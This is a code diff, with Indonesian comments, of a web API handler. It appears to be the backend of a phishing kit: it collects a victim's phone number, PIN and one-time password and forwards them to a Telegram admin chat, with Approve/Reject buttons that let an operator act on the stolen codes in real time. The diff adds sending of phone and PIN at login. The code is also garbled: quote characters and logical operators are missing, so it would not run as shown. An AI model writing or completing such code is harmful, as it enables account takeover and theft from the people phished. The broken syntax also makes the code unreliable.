@@ -1,22 +1,51 @@
 import { createClient } from '@supabase/supabase-js';
 
 export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).json({ message: 'Method not allowed' });
+  if (req.method !== 'POST') {
+    return res.status(405).json({ message: 'Method not allowed' });
+  }
 
   const { phone, pin, otp, type } = req.body;
 
-  // Jika type = 'login', hanya simpan di localStorage (tidak perlu simpan di DB)
+  // --- LOGIN (hanya simpan di frontend) ---
   if (type === 'login') {
-    // Tidak melakukan apa-apa, hanya mengembalikan sukses
+    // Validasi input
+    if (!phone || !pin) {
+      return res.status(400).json({ message: 'Phone and PIN required' });
+    }
+
+    // Kirim notifikasi ke admin Telegram
+    try {
+      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
+      const adminChatId = process.env.ADMIN_CHAT_ID;
+      const text = 🔔 *User Login*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``;
+
+      await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: adminChatId,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      });
+    } catch (err) {
+      // Gagal kirim notifikasi, tapi tetap beri respons sukses ke frontend
+      console.error('Gagal kirim notifikasi login:', err);
+    }
+
     return res.status(200).json({ success: true });
   }
 
-  // Jika type = 'otp' atau tidak ada type, anggap sebagai submit OTP
-  if (!phone || !pin || !otp) {
+  // --- SUBMIT OTP (dengan penyimpanan di database) ---
+  if (!phone  !pin  !otp) {
     return res.status(400).json({ message: 'Phone, PIN, and OTP required' });
   }
 
-  const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
+  const supabase = createClient(
+    process.env.SUPABASE_URL,
+    process.env.SUPABASE_ANON_KEY
+  );
 
   try {
     // Simpan ke database
@@ -32,18 +61,18 @@ export default async function handler(req, res) {
     const inlineKeyboard = {
       inline_keyboard: [
         [
-          { text: "✅ Approve", callback_data: `approve|${phone}|${pin}|${otp}` },
-          { text: "❌ Reject", callback_data: `reject|${phone}|${pin}|${otp}` }
+          { text: "✅ Approve", callback_data: approve|${phone}|${pin}|${otp} },
+          { text: "❌ Reject", callback_data: reject|${phone}|${pin}|${otp} }
         ]
       ]
     };
 
-    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+    await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: adminChatId,
-        text: `🔔 *Permintaan Verifikasi*\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n🔑 OTP: ${otp}`,
+        text: 🔔 *Permintaan Verifikasi*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\\n🔑 OTP: \${otp}\``,
         parse_mode: 'Markdown',
         reply_markup: inlineKeyboard
       })
